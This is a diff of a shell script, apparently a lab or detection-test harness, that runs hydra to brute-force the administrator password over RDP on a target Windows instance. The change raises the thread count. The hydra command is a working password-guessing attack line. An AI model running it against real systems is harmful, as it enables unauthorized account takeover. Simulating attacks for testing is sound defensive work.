@@ -63,7 +63,7 @@ echo '* windows instance.                                                   *'
 echo '***********************************************************************'
 echo
 echo 'Sending 250 password attempts at the windows server...'
-hydra -t 2 -f -l administrator -P ./passwords/password_list.txt rdp://$BASIC_WINDOWS_TARGET
+hydra -t 4 -f -l administrator -P ./passwords/password_list.txt rdp://$BASIC_WINDOWS_TARGET
 echo
 echo '-----------------------------------------------------------------------'
 echo
